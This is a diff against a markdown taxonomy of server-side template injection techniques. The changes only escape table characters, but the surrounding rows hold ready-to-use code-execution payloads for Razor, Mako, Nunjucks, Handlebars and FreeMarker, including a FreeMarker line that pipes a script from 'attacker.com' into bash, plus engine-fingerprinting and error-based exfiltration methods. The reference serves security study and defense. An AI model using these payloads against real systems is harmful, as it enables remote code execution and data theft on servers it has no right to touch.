@@ -56,7 +56,7 @@ These engines provide explicit delimiters for embedding and executing raw code w
 | **C# Razor blocks** | Razor (.NET) | `@{ }` and `@expression` syntax execute C# code | `@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }` |
 | **Python embedded blocks** | Mako (Python) | `<% %>` blocks execute Python directly | `<% import os; os.system('id') %>` |
 | **Python expression tags** | Mako (Python) | `${expression}` evaluates Python expressions | `${__import__('os').popen('id').read()}` |
-| **Perl code blocks** | Mojolicious (Perl) | `<%= %>` and `<% %>` execute Perl code | `<%= `id` %>` |
+| **Perl code blocks** | Mojolicious (Perl) | `<%= %>` and `<% %>` execute Perl code | ``<%= `id` %>`` |
 
 Inline code block execution is the most straightforward SSTI primitive. If the template engine supports it and no sandbox is applied, the attacker's payload is limited only by the capabilities of the host language runtime. The primary defense is to never allow untrusted input to enter template source code.
 
@@ -111,7 +111,7 @@ In JavaScript template engines (Node.js), the exploitation mirrors Python's MRO 
 | **Range constructor** | Nunjucks | `range.constructor` is `Function`, allowing code eval from string | `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
 | **Cycler constructor** | Nunjucks | Alternative to range; same `Function` constructor access | `{{ cycler.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
 | **String constructor chain** | Handlebars, Pug, EJS, JsRender | `''.constructor.constructor` yields `Function` | `${ ''.toString.constructor.call({},"return global.process.mainModule.require('child_process').execSync('id')")() }` |
-| **Nested helper abuse** | Handlebars | Chain `#with`, `split`, `push`, `pop` helpers to build code execution | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...{{/with}}{{/with}}{{/with}}` |
+| **Nested helper abuse** | Handlebars | Chain `#with`, `split`, `push`, `pop` helpers to build code execution | `{{#with "s" as \|string\|}}{{#with "e"}}{{#with split as \|conslist\|}}...{{/with}}{{/with}}{{/with}}` |
 | **Template7 js helper** | Template7 | Built-in `js` helper evaluates JavaScript | `{{js "global.process.mainModule.require('child_process').execSync('id')"}}` |
 | **Marko out expression** | Marko | `${expression}` evaluates arbitrary JS | `${require('child_process').execSync('id')}` |
 
@@ -144,7 +144,7 @@ FreeMarker provides several built-in functions that enable code execution when n
 | **`?lower_abc` / `?upper_abc` character encoding** | Converts numbers to alphabet characters, enabling filter bypass | FreeMarker expression context | `6?lower_abc` → `"f"`, enabling character-by-character payload construction |
 | **`ObjectConstructor` instantiation** | Direct object creation via built-in `ObjectConstructor` | `UNRESTRICTED_RESOLVER` or `SAFER_RESOLVER` not blocking it | `<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}` |
 | **`JythonRuntime` execution** | Execute Jython (Python-on-JVM) code within FreeMarker | Jython available on classpath, resolver not blocking | `<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.system("id")</@jr>` |
-| **`assign` + `include` chain** | Assign data model variables then include attacker-controlled resources | Template directive injection | `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl attacker.com/shell.sh | bash")}` |
+| **`assign` + `include` chain** | Assign data model variables then include attacker-controlled resources | Template directive injection | `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl attacker.com/shell.sh \| bash")}` |
 
 ### §3-2. Twig Built-in Exploitation
 
@@ -311,7 +311,7 @@ Template engine identification is a critical prerequisite for exploitation. Diff
 |---|---|---|
 | **Delimiter-based identification** | Test different delimiter styles: `{{ }}`, `<% %>`, `${ }`, `#{ }`, `{% %}` | Which delimiters cause evaluation vs. literal output |
 | **Built-in object probing** | Probe for engine-specific objects: `self`, `_self`, `this`, `request`, `env` | Object existence confirms specific engine |
-| **Filter/function availability** | Test engine-specific filters: `|attr`, `?api`, `|sort`, `|map` | Filter existence narrows engine identity |
+| **Filter/function availability** | Test engine-specific filters: `\|attr`, `?api`, `\|sort`, `\|map` | Filter existence narrows engine identity |
 | **Comment syntax testing** | Test comment delimiters: `{# #}`, `<%-- --%>`, `{{!-- --}}` | Comment rendering behavior |
 | **DNS/time-based blind detection** | Use `sleep()`, DNS lookups, or HTTP callbacks for blind SSTI | Out-of-band signals confirm template evaluation |
 | **Error-based reflection exfiltration** | Deliberately trigger a runtime error whose error message or stack trace incorporates the target data — e.g., forcing a type error by concatenating secret data with an incompatible type (`{{ secret_var + [] }}`), or causing a NameError/UndefinedError where the variable name itself carries exfiltrated content. The reflected error message in the HTTP response carries the extracted data without requiring out-of-band channels | Template engine returns verbose error messages to the client or writes them to accessible logs; expression evaluation within error context (vladko312 "Blind SSTI" research, 2025) |
